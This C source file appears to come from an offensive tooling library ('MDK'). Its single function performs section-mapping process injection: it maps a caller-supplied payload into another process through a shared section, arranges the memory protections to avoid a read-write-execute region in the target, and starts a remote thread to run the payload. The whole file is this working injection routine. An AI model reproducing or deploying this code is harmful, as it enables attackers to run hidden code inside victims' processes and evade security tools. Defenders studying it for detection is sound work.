// MDK
// docs    : https://sebafvs.com/mdk/section
// author  : @sebafvs

#include <windows.h>
#include "mdk/execution.h"
#include "mdk/memory.h"
#include "mdk/thread.h"
#include "mdk/process.h"
#include "mdk/utils.h"
#include "mdk/nt.h"

MDK_RESULT mdk_section_inject(IN HANDLE process, IN const BYTE* payload, IN SIZE_T size, OUT HANDLE* out_thread) {
    HANDLE     section     = NULL;
    PVOID      local_view  = NULL;
    PVOID      remote_view = NULL;
    HANDLE     thread      = NULL;
    MDK_RESULT r           = { 0 };

    r = mdk_create_section(size, PAGE_EXECUTE_READWRITE, &section);
    if (MDK_FAIL(r)) { return r; }

    // Local view RW, memcpy the payload.
    r = mdk_map(section, (HANDLE)(LONG_PTR)-1, size, PAGE_READWRITE, &local_view);
    if (MDK_FAIL(r)) { goto _cleanup; }

    mdk_memcpy(local_view, payload, size);

    mdk_unmap((HANDLE)(LONG_PTR)-1, local_view);
    local_view = NULL;

    // Remote view RX only, the target never sees RW+X on this region.
    r = mdk_map(section, process, size, PAGE_EXECUTE_READ, &remote_view);
    if (MDK_FAIL(r)) { goto _cleanup; }

    // Section handle no longer needed once both views are resolved.
    mdk_close_handle(section);
    section = NULL;

    r = mdk_create_remote_thread(process, remote_view, NULL, 0, &thread);
    if (MDK_FAIL(r)) { goto _cleanup; }

    *out_thread = thread;
    return MDK_MAKE_OK();

_cleanup:
    if (thread)      { mdk_close_thread(thread); }
    if (remote_view) { mdk_unmap(process, remote_view); }
    if (local_view)  { mdk_unmap((HANDLE)(LONG_PTR)-1, local_view); }
    if (section)     { mdk_close_handle(section); }
    return r;
}
